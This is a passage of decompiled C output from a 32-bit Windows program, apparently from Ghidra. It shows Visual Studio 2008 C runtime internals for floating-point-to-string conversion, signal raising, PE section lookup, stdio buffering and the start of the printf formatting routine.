    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_1c != '\0') {
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
    }
    return iVar15;
  }
  *param_2 = 0;
  if (param_3 <= param_4 + 0xb) {
    piVar2 = __errno();
    iVar15 = 0x22;
    goto LAB_00418e8f;
  }
  local_10 = *(uint *)param_1;
  if ((*(uint *)((int)param_1 + 4) >> 0x14 & 0x7ff) == 0x7ff) {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - 2;
    }
    eVar3 = __cftoe(param_1,param_2 + 2,_SizeInBytes,param_4,0);
    if (eVar3 != 0) {
      *param_2 = 0;
      if (local_1c == '\0') {
        return eVar3;
      }
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      return eVar3;
    }
    if (param_2[2] == '-') {
      *param_2 = 0x2d;
      param_2 = param_2 + 1;
    }
    *param_2 = 0x30;
    param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
    pcVar4 = _strrchr(param_2 + 2,0x65);
    if (pcVar4 != (char *)0x0) {
      *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
      pcVar4[3] = '\0';
    }
    goto LAB_004191b3;
  }
  if ((*(uint *)((int)param_1 + 4) & 0x80000000) != 0) {
    *param_2 = 0x2d;
    param_2 = param_2 + 1;
  }
  *param_2 = 0x30;
  param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
  sVar9 = (-(ushort)(param_5 != 0) & 0xffe0) + 0x27;
  if ((*(uint *)((int)param_1 + 4) & 0x7ff00000) == 0) {
    param_2[2] = 0x30;
    if ((*(uint *)param_1 | *(uint *)((int)param_1 + 4) & 0xfffff) == 0) {
      local_18 = 0;
    }
    else {
      local_18 = 0x3fe;
    }
  }
  else {
    param_2[2] = 0x31;
  }
  pcVar11 = param_2 + 3;
  pcVar4 = param_2 + 4;
  if (param_4 == 0) {
    *pcVar11 = '\0';
  }
  else {
    *pcVar11 = ***(char ***)(local_28[0] + 0xbc);
  }
  if (((*(uint *)((int)param_1 + 4) & 0xfffff) != 0) || (local_c = 0, *(int *)param_1 != 0)) {
    local_10 = 0;
    local_c = 0xf0000;
    do {
      if ((int)param_4 < 1) break;
      uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff);
      uVar1 = (short)uVar13 + 0x30;
      if (0x39 < uVar1) {
        uVar1 = uVar1 + sVar9;
      }
      local_8 = local_8 + -4;
      *pcVar4 = (char)uVar1;
      local_10 = local_10 >> 4 | local_c << 0x1c;
      local_c = local_c >> 4;
      pcVar4 = pcVar4 + 1;
      param_4 = param_4 - 1;
    } while (-1 < (short)local_8);
    if ((-1 < (short)local_8) &&
       (uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff),
       pcVar10 = pcVar4, 8 < (ushort)uVar13)) {
      while( true ) {
        pcVar5 = pcVar10 + -1;
        if ((*pcVar5 != 'f') && (*pcVar5 != 'F')) break;
        *pcVar5 = '0';
        pcVar10 = pcVar5;
      }
      if (pcVar5 == pcVar11) {
        pcVar10[-2] = pcVar10[-2] + '\x01';
      }
      else if (*pcVar5 == '9') {
        *pcVar5 = (char)sVar9 + ':';
      }
      else {
        *pcVar5 = *pcVar5 + '\x01';
      }
    }
  }
  if (0 < (int)param_4) {
    _memset(pcVar4,0x30,param_4);
    pcVar4 = pcVar4 + param_4;
  }
  if (*pcVar11 == '\0') {
    pcVar4 = pcVar11;
  }
  *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
  uVar13 = __aullshr(0x34,*(uint *)((int)param_1 + 4));
  uVar6 = (uint)(uVar13 & 0x7ff);
  uVar7 = uVar6 - local_18;
  uVar6 = (uint)(uVar6 < local_18);
  uVar8 = -uVar6;
  if (uVar6 == 0) {
    pcVar4[1] = '+';
  }
  else {
    pcVar4[1] = '-';
    bVar12 = uVar7 != 0;
    uVar7 = -uVar7;
    uVar8 = -(uVar8 + bVar12);
  }
  pcVar10 = pcVar4 + 2;
  *pcVar10 = '0';
  pcVar11 = pcVar10;
  if (((int)uVar8 < 0) || (((int)uVar8 < 1 && (uVar7 < 1000)))) {
LAB_00419162:
    if ((-1 < (int)uVar8) && ((0 < (int)uVar8 || (99 < uVar7)))) goto LAB_0041916d;
  }
  else {
    uVar14 = __alldvrm(uVar7,uVar8,1000,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar10 = (char)uVar14 + '0';
    pcVar11 = pcVar4 + 3;
    uVar8 = 0;
    uVar7 = extraout_ECX;
    if (pcVar11 == pcVar10) goto LAB_00419162;
LAB_0041916d:
    uVar14 = __alldvrm(uVar7,uVar8,100,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar8 = 0;
    uVar7 = extraout_ECX_00;
  }
  if ((pcVar11 != pcVar10) || ((-1 < (int)uVar8 && ((0 < (int)uVar8 || (9 < uVar7)))))) {
    uVar14 = __alldvrm(uVar7,uVar8,10,0);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar7 = extraout_ECX_01;
  }
  *pcVar11 = (char)uVar7 + '0';
  pcVar11[1] = '\0';
LAB_004191b3:
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
  return 0;
}



// Library Function - Single Match
//  __cftof2_l
// 
// Library: Visual Studio 2008 Release

undefined4 __thiscall
__cftof2_l(void *this,int param_1,size_t param_2,char param_3,localeinfo_struct *param_4)

{
  int iVar1;
  int *in_EAX;
  int *piVar2;
  undefined *puVar3;
  undefined4 uVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  iVar1 = in_EAX[1];
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_4);
  if ((this == (void *)0x0) || (param_1 == 0)) {
    piVar2 = __errno();
    uVar4 = 0x16;
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else {
    if ((param_3 != '\0') && (iVar1 - 1U == param_2)) {
      puVar3 = (undefined *)((uint)(*in_EAX == 0x2d) + (iVar1 - 1U) + (int)this);
      *puVar3 = 0x30;
      puVar3[1] = 0;
    }
    if (*in_EAX == 0x2d) {
      *(undefined *)this = 0x2d;
      this = (void *)((int)this + 1);
    }
    if (in_EAX[1] < 1) {
      __shift();
      *(undefined *)this = 0x30;
      puVar3 = (undefined *)((int)this + 1);
    }
    else {
      puVar3 = (undefined *)((int)this + in_EAX[1]);
    }
    if (0 < (int)param_2) {
      __shift();
      *puVar3 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      iVar1 = in_EAX[1];
      if (iVar1 < 0) {
        if ((param_3 != '\0') || (SBORROW4(param_2,-iVar1) == (int)(param_2 + iVar1) < 0)) {
          param_2 = -iVar1;
        }
        __shift();
        _memset(puVar3 + 1,0x30,param_2);
      }
    }
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    uVar4 = 0;
  }
  return uVar4;
}



// Library Function - Single Match
//  __cftof_l
// 
// Library: Visual Studio 2008 Release

void __cdecl
__cftof_l(double *param_1,undefined *param_2,int param_3,size_t param_4,localeinfo_struct *param_5)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if (param_3 == -1) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - (uint)(local_30.sign == 0x2d);
    }
    eVar2 = __fptostr(param_2 + (local_30.sign == 0x2d),_SizeInBytes,local_30.decpt + param_4,
                      &local_30);
    if (eVar2 == 0) {
      __cftof2_l(param_2,param_3,param_4,'\0',param_5);
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cftog_l
// 
// Library: Visual Studio 2008 Release

void __cdecl
__cftog_l(double *param_1,undefined *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  char *pcVar1;
  int *piVar2;
  errno_t eVar3;
  size_t _SizeInBytes;
  char *pcVar4;
  _strflt local_34;
  int local_24;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_34,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    local_24 = local_34.decpt + -1;
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - (local_34.sign == 0x2d);
    }
    eVar3 = __fptostr(param_2 + (local_34.sign == 0x2d),_SizeInBytes,param_4,&local_34);
    if (eVar3 == 0) {
      local_34.decpt = local_34.decpt + -1;
      if ((local_34.decpt < -4) || ((int)param_4 <= local_34.decpt)) {
        __cftoe2_l(param_3,param_4,param_5,&local_34.sign,'\x01',param_6);
      }
      else {
        pcVar1 = param_2 + (local_34.sign == 0x2d);
        if (local_24 < local_34.decpt) {
          do {
            pcVar4 = pcVar1;
            pcVar1 = pcVar4 + 1;
          } while (*pcVar4 != '\0');
          pcVar4[-1] = '\0';
        }
        __cftof2_l(param_2,param_3,param_4,'\x01',param_6);
      }
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cfltcvt_l
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__cfltcvt_l(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps,
           _locale_t plocinfo)

{
  errno_t eVar1;
  
  if ((format == 0x65) || (format == 0x45)) {
    eVar1 = __cftoe_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
  }
  else {
    if (format == 0x66) {
      eVar1 = __cftof_l(arg,buffer,sizeInBytes,precision,plocinfo);
      return eVar1;
    }
    if ((format == 0x61) || (format == 0x41)) {
      eVar1 = __cftoa_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
    else {
      eVar1 = __cftog_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
  }
  return eVar1;
}



// Library Function - Single Match
//  __cfltcvt
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release,
// Visual Studio 2012 Release

errno_t __cdecl
__cfltcvt(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps)

{
  errno_t eVar1;
  
  eVar1 = __cfltcvt_l(arg,buffer,sizeInBytes,format,precision,caps,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __initp_misc_cfltcvt_tab
// 
// Library: Visual Studio 2008 Release

void __initp_misc_cfltcvt_tab(void)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  
  uVar3 = 0;
  do {
    piVar1 = (int *)((int)&PTR_LAB_0042be34 + uVar3);
    iVar2 = __encode_pointer(*piVar1);
    uVar3 = uVar3 + 4;
    *piVar1 = iVar2;
  } while (uVar3 < 0x28);
  return;
}



// Library Function - Single Match
//  __setdefaultprecision
// 
// Library: Visual Studio 2008 Release

void __setdefaultprecision(void)

{
  errno_t eVar1;
  
  eVar1 = __controlfp_s((uint *)0x0,0x10000,0x30000);
  if (eVar1 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return;
}



// WARNING: Removing unreachable block (ram,0x0041959f)
// Library Function - Single Match
//  __ms_p5_test_fdiv
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 __ms_p5_test_fdiv(void)

{
  return 0;
}



// Library Function - Single Match
//  __ms_p5_mp_test_fdiv
// 
// Library: Visual Studio 2008 Release

void __ms_p5_mp_test_fdiv(void)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleA("KERNEL32");
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,"IsProcessorFeaturePresent");
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(0);
      return;
    }
  }
  __ms_p5_test_fdiv();
  return;
}



// Library Function - Single Match
//  __ValidateImageBase
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

BOOL __cdecl __ValidateImageBase(PBYTE pImageBase)

{
  if ((*(short *)pImageBase == 0x5a4d) &&
     (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550)) {
    return (uint)(*(short *)((int)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x10b);
  }
  return 0;
}



// Library Function - Single Match
//  __FindPESection
// 
// Library: Visual Studio 2008 Release

PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  int iVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  uint uVar3;
  
  iVar1 = *(int *)(pImageBase + 0x3c);
  uVar3 = 0;
  p_Var2 = (PIMAGE_SECTION_HEADER)
           (pImageBase + *(ushort *)(pImageBase + iVar1 + 0x14) + 0x18 + iVar1);
  if (*(ushort *)(pImageBase + iVar1 + 6) != 0) {
    do {
      if ((p_Var2->VirtualAddress <= rva) &&
         (rva < (p_Var2->Misc).PhysicalAddress + p_Var2->VirtualAddress)) {
        return p_Var2;
      }
      uVar3 = uVar3 + 1;
      p_Var2 = p_Var2 + 1;
    } while (uVar3 < *(ushort *)(pImageBase + iVar1 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



// Library Function - Single Match
//  __IsNonwritableInCurrentImage
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE pTarget)

{
  BOOL BVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  void *local_14;
  code *pcStack_10;
  uint local_c;
  undefined4 local_8;
  
  pcStack_10 = __except_handler4;
  local_14 = ExceptionList;
  local_c = DAT_0042b0a0 ^ 0x429650;
  ExceptionList = &local_14;
  local_8 = 0;
  BVar1 = __ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_00400000);
  if (BVar1 != 0) {
    p_Var2 = __FindPESection((PBYTE)&IMAGE_DOS_HEADER_00400000,(DWORD_PTR)(pTarget + -0x400000));
    if (p_Var2 != (PIMAGE_SECTION_HEADER)0x0) {
      ExceptionList = local_14;
      return ~(p_Var2->Characteristics >> 0x1f) & 1;
    }
  }
  ExceptionList = local_14;
  return 0;
}



// Library Function - Single Match
//  __initp_misc_winsig
// 
// Library: Visual Studio 2008 Release

void __cdecl __initp_misc_winsig(undefined4 param_1)

{
  DAT_0042dafc = param_1;
  DAT_0042db00 = param_1;
  DAT_0042db04 = param_1;
  DAT_0042db08 = param_1;
  return;
}



// Library Function - Single Match
//  _siglookup
// 
// Library: Visual Studio 2008 Release

uint __fastcall _siglookup(undefined4 param_1,int param_2,uint param_3)

{
  uint uVar1;
  
  uVar1 = param_3;
  do {
    if (*(int *)(uVar1 + 4) == param_2) break;
    uVar1 = uVar1 + 0xc;
  } while (uVar1 < DAT_0042be08 * 0xc + param_3);
  if ((DAT_0042be08 * 0xc + param_3 <= uVar1) || (*(int *)(uVar1 + 4) != param_2)) {
    uVar1 = 0;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___get_sigabrt
// 
// Library: Visual Studio 2008 Release

_PHNDLR __cdecl ___get_sigabrt(void)

{
  _PHNDLR p_Var1;
  
  p_Var1 = (_PHNDLR)__decode_pointer(DAT_0042db04);
  return p_Var1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _raise
// 
// Library: Visual Studio 2008 Release

int __cdecl _raise(int _SigNum)

{
  uint uVar1;
  int *piVar2;
  code *pcVar3;
  int iVar4;
  code *pcVar5;
  undefined4 extraout_ECX;
  code **ppcVar6;
  _ptiddata p_Var7;
  int local_34;
  void *local_30;
  int local_28;
  int local_20;
  
  p_Var7 = (_ptiddata)0x0;
  local_20 = 0;
  if (_SigNum < 0xc) {
    if (_SigNum != 0xb) {
      if (_SigNum == 2) {
        ppcVar6 = (code **)&DAT_0042dafc;
        iVar4 = DAT_0042dafc;
        goto LAB_00419844;
      }
      if (_SigNum != 4) {
        if (_SigNum == 6) goto LAB_00419822;
        if (_SigNum != 8) goto LAB_00419806;
      }
    }
    p_Var7 = __getptd_noexit();
    if (p_Var7 == (_ptiddata)0x0) {
      return -1;
    }
    uVar1 = _siglookup(extraout_ECX,_SigNum,(uint)p_Var7->_pxcptacttab);
    ppcVar6 = (code **)(uVar1 + 8);
    pcVar3 = *ppcVar6;
  }
  else {
    if (_SigNum == 0xf) {
      ppcVar6 = (code **)&DAT_0042db08;
      iVar4 = DAT_0042db08;
    }
    else if (_SigNum == 0x15) {
      ppcVar6 = (code **)&DAT_0042db00;
      iVar4 = DAT_0042db00;
    }
    else {
      if (_SigNum != 0x16) {
LAB_00419806:
        piVar2 = __errno();
        *piVar2 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        return -1;
      }
LAB_00419822:
      ppcVar6 = (code **)&DAT_0042db04;
      iVar4 = DAT_0042db04;
    }
LAB_00419844:
    local_20 = 1;
    pcVar3 = (code *)__decode_pointer(iVar4);
  }
  iVar4 = 0;
  if (pcVar3 == (code *)0x1) {
    return 0;
  }
  if (pcVar3 == (code *)0x0) {
    iVar4 = __exit(3);
  }
  if (local_20 != iVar4) {
    __lock(iVar4);
  }
  if (((_SigNum == 8) || (_SigNum == 0xb)) || (_SigNum == 4)) {
    local_30 = p_Var7->_tpxcptinfoptrs;
    p_Var7->_tpxcptinfoptrs = (void *)0x0;
    if (_SigNum == 8) {
      local_34 = p_Var7->_tfpecode;
      p_Var7->_tfpecode = 0x8c;
      goto LAB_004198a8;
    }
  }
  else {
LAB_004198a8:
    if (_SigNum == 8) {
      for (local_28 = DAT_0042bdfc; local_28 < DAT_0042be00 + DAT_0042bdfc; local_28 = local_28 + 1)
      {
        *(undefined4 *)(local_28 * 0xc + 8 + (int)p_Var7->_pxcptacttab) = 0;
      }
      goto LAB_004198e2;
    }
  }
  pcVar5 = (code *)__encoded_null();
  *ppcVar6 = pcVar5;
LAB_004198e2:
  FUN_00419903();
  if (_SigNum == 8) {
    (*pcVar3)(8,p_Var7->_tfpecode);
  }
  else {
    (*pcVar3)(_SigNum);
    if ((_SigNum != 0xb) && (_SigNum != 4)) {
      return 0;
    }
  }
  p_Var7->_tpxcptinfoptrs = local_30;
  if (_SigNum == 8) {
    p_Var7->_tfpecode = local_34;
  }
  return 0;
}



void FUN_00419903(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    FUN_00412cbf(0);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0041993f(undefined4 param_1)

{
  _DAT_0042db10 = param_1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0041994e(undefined4 param_1)

{
  _DAT_0042db14 = param_1;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___crtInitCritSecAndSpinCount
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl ___crtInitCritSecAndSpinCount(LPCRITICAL_SECTION param_1,DWORD param_2)

{
  BOOL BVar1;
  
  BVar1 = InitializeCriticalSectionAndSpinCount(param_1,param_2);
  return BVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __stbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __stbuf(FILE *_File)

{
  char **ppcVar1;
  int iVar2;
  undefined **ppuVar3;
  char *pcVar4;
  
  iVar2 = __fileno(_File);
  iVar2 = __isatty(iVar2);
  if (iVar2 == 0) {
    return 0;
  }
  ppuVar3 = FUN_00412435();
  if (_File == (FILE *)(ppuVar3 + 8)) {
    iVar2 = 0;
  }
  else {
    ppuVar3 = FUN_00412435();
    if (_File != (FILE *)(ppuVar3 + 0x10)) {
      return 0;
    }
    iVar2 = 1;
  }
  _DAT_0042d0d8 = _DAT_0042d0d8 + 1;
  if ((_File->_flag & 0x10cU) != 0) {
    return 0;
  }
  ppcVar1 = (char **)(&DAT_0042db18 + iVar2);
  if (*ppcVar1 == (char *)0x0) {
    pcVar4 = (char *)__malloc_crt(0x1000);
    *ppcVar1 = pcVar4;
    if (pcVar4 == (char *)0x0) {
      _File->_base = (char *)&_File->_charbuf;
      _File->_ptr = (char *)&_File->_charbuf;
      _File->_bufsiz = 2;
      _File->_cnt = 2;
      goto LAB_00419a46;
    }
  }
  pcVar4 = *ppcVar1;
  _File->_base = pcVar4;
  _File->_ptr = pcVar4;
  _File->_bufsiz = 0x1000;
  _File->_cnt = 0x1000;
LAB_00419a46:
  _File->_flag = _File->_flag | 0x1102;
  return 1;
}



// Library Function - Single Match
//  __ftbuf
// 
// Library: Visual Studio 2008 Release

void __cdecl __ftbuf(int _Flag,FILE *_File)

{
  if ((_Flag != 0) && ((_File->_flag & 0x1000U) != 0)) {
    __flush(_File);
    _File->_flag = _File->_flag & 0xffffeeff;
    _File->_bufsiz = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
  }
  return;
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2008 Release

void __fastcall _write_char(FILE *param_1)

{
  int *piVar1;
  byte in_AL;
  uint uVar2;
  int *unaff_ESI;
  
  if (((*(byte *)&param_1->_flag & 0x40) == 0) || (param_1->_base != (char *)0x0)) {
    piVar1 = &param_1->_cnt;
    *piVar1 = *piVar1 + -1;
    if (*piVar1 < 0) {
      uVar2 = __flsbuf((int)(char)in_AL,param_1);
    }
    else {
      *param_1->_ptr = in_AL;
      param_1->_ptr = param_1->_ptr + 1;
      uVar2 = (uint)in_AL;
    }
    if (uVar2 == 0xffffffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_multi_char
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_multi_char(undefined4 param_1,int param_2,FILE *param_3)

{
  int *in_EAX;
  
  do {
    if (param_2 < 1) {
      return;
    }
    param_2 = param_2 + -1;
    _write_char(param_3);
  } while (*in_EAX != -1);
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_string(int param_1)

{
  int *in_EAX;
  int *piVar1;
  FILE *unaff_EDI;
  
  if (((*(byte *)&unaff_EDI->_flag & 0x40) == 0) || (unaff_EDI->_base != (char *)0x0)) {
    while (0 < param_1) {
      param_1 = param_1 + -1;
      _write_char(unaff_EDI);
      if (*in_EAX == -1) {
        piVar1 = __errno();
        if (*piVar1 != 0x2a) {
          return;
        }
        _write_char(unaff_EDI);
      }
    }
  }
  else {
    *in_EAX = *in_EAX + param_1;
  }
  return;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __output_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __output_l(FILE *_File,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  byte bVar1;
  wchar_t _WCh;
  FILE *pFVar2;
  int *piVar3;
  uint uVar4;
  code *pcVar5;
  int *piVar6;
  errno_t eVar7;
  int iVar8;
  undefined *puVar9;
  int extraout_ECX;
  byte *pbVar10;
  char *pcVar11;
  bool bVar12;
  undefined8 uVar13;
  int **ppiVar14;
  int *piVar15;
  int *piVar16;
  undefined4 uVar17;
  localeinfo_struct *plVar18;
  int *local_27c;
  int *local_278;
  undefined4 local_274;
  int local_270;
  int local_26c [2];
  int *local_264;
  localeinfo_struct local_260;
  int local_258;
  char local_254;
  FILE *local_250;
  int local_24c;
  int *local_248;
  int local_244;
  byte *local_240;
  int local_23c;
  int *local_238;
  int local_234;
  undefined local_230;
  char local_22f;
  int local_22c;
  int **local_228;
  int *local_224;
  int *local_220;
  int *local_21c;
  byte local_215;
  uint local_214;
  int local_210 [127];
  undefined local_11 [9];
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  local_250 = _File;
  local_228 = (int **)_ArgList;
  local_24c = 0;
  local_214 = 0;
  local_238 = (int *)0x0;
  local_21c = (int *)0x0;
  local_234 = 0;
  local_244 = 0;
  local_23c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_260,_Locale);
  if (_File != (FILE *)0x0) {
    if ((*(byte *)&_File->_flag & 0x40) == 0) {
      uVar4 = __fileno(_File);
      if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
        puVar9 = &DAT_0042b798;
      }
      else {
        puVar9 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0046eb40)[(int)uVar4 >> 5]);
      }
      if ((puVar9[0x24] & 0x7f) == 0) {
        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
          puVar9 = &DAT_0042b798;
        }
        else {
          puVar9 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0046eb40)[(int)uVar4 >> 5]);
        }
        if ((puVar9[0x24] & 0x80) == 0) goto LAB_00419c39;
      }
    }
    else {
LAB_00419c39:
      if (_Format != (char *)0x0) {
        local_215 = *_Format;
        local_22c = 0;
        local_224 = (int *)0x0;
        local_248 = (int *)0x0;
        iVar8 = 0;
        while ((local_215 != 0 &&
               (pbVar10 = (byte *)_Format + 1, local_240 = pbVar10, -1 < local_22c))) {
          if ((byte)(local_215 - 0x20) < 0x59) {
            uVar4 = (int)"KERNEL32"[(char)local_215 + 4] & 0xf;
          }
          else {
            uVar4 = 0;
          }
          local_270 = (int)(char)(&DAT_004256d0)[uVar4 * 8 + iVar8] >> 4;
          switch(local_270) {
          case 0:
switchD_00419cb2_caseD_0:
            local_23c = 0;
            iVar8 = __isleadbyte_l((uint)local_215,&local_260);
            if (iVar8 != 0) {
              _write_char(local_250);
              local_240 = (byte *)_Format + 2;
              if (*pbVar10 == 0) goto LAB_00419ba0;
            }
            _write_char(local_250);
            break;
          case 1:
            local_21c = (int *)0xffffffff;
            local_274 = 0;
            local_244 = 0;
            local_238 = (int *)0x0;
            local_234 = 0;
            local_214 = 0;
            local_23c = 0;
            break;
          case 2:
            if (local_215 == 0x20) {
              local_214 = local_214 | 2;
            }
            else if (local_215 == 0x23) {
              local_214 = local_214 | 0x80;
            }
            else if (local_215 == 0x2b) {
              local_214 = local_214 | 1;
            }
            else if (local_215 == 0x2d) {
              local_214 = local_214 | 4;
            }
            else if (local_215 == 0x30) {
              local_214 = local_214 | 8;
            }
            break;
          case 3:
            if (local_215 == 0x2a) {
              local_228 = (int **)((int)_ArgList + 4);
              local_238 = *(int **)_ArgList;
              if ((int)local_238 < 0) {
                local_214 = local_214 | 4;
                local_238 = (int *)-(int)local_238;
              }
            }
            else {
              local_238 = (int *)((int)local_238 * 10 + -0x30 + (int)(char)local_215);
            }
            break;
          case 4:
            local_21c = (int *)0x0;
            break;
          case 5:
            if (local_215 == 0x2a) {
              local_228 = (int **)((int)_ArgList + 4);
              local_21c = *(int **)_ArgList;
              if ((int)local_21c < 0) {
                local_21c = (int *)0xffffffff;
              }
            }
            else {
              local_21c = (int *)((int)local_21c * 10 + -0x30 + (int)(char)local_215);
            }
            break;
          case 6:
            if (local_215 == 0x49) {
              bVar1 = *pbVar10;
              if ((bVar1 == 0x36) && (((byte *)_Format)[2] == 0x34)) {
                local_214 = local_214 | 0x8000;
                local_240 = (byte *)_Format + 3;
              }
              else if ((bVar1 == 0x33) && (((byte *)_Format)[2] == 0x32)) {
                local_214 = local_214 & 0xffff7fff;
                local_240 = (byte *)_Format + 3;
              }
              else if (((((bVar1 != 100) && (bVar1 != 0x69)) && (bVar1 != 0x6f)) &&
                       ((bVar1 != 0x75 && (bVar1 != 0x78)))) && (bVar1 != 0x58)) {
                local_270 = 0;
                goto switchD_00419cb2_caseD_0;
              }
            }
            else if (local_215 == 0x68) {
              local_214 = local_214 | 0x20;
            }
            else if (local_215 == 0x6c) {
              if (*pbVar10 == 0x6c) {
                local_214 = local_214 | 0x1000;
                local_240 = (byte *)_Format + 2;
              }
              else {
                local_214 = local_214 | 0x10;
              }
            }
            else if (local_215 == 0x77) {
              local_214 = local_214 | 0x800;
            }
            break;
          case 7:
            if ((char)local_215 < 'e') {
              if (local_215 == 100) {
LAB_0041a19d:
                local_214 = local_214 | 0x40;
LAB_0041a1a4:
                local_224 = (int *)0xa;
LAB_0041a1ae:
